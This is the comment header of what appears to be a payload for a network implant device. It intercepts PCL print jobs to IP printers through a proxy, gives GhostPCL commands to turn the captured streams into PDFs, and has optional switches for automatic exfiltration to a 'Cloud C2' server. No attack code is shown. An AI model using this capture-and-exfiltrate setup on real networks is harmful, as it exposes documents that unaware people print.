# Title: Printer Capture
#
# Description: Capture PCL IP printer jobs with a dynamic proxy 

# To convert PCL files to PDF, use a tool like GhostPCL:
# https://ghostscript.com/releases/gpcldnld.html 
#
# To convert a stream (captured-file.stream) to PDF (printed.pdf), use something 
# like:
# ./gpcl6-1000-linux-x86_64 -o printed.pdf -sDEVICE=pdfwrite captured-file.stream 

# Do we automatically exfiltrate to Cloud C2?  Uncomment to send files to your 
# CloudC2 server automatically
# 
# USE_C2=1

# By default, C2WATCHDIR removes files after they're sent.  To keep them, uncomment 
# C2_KEEP_FILES below
# 
# C2_KEEP_FILES=1
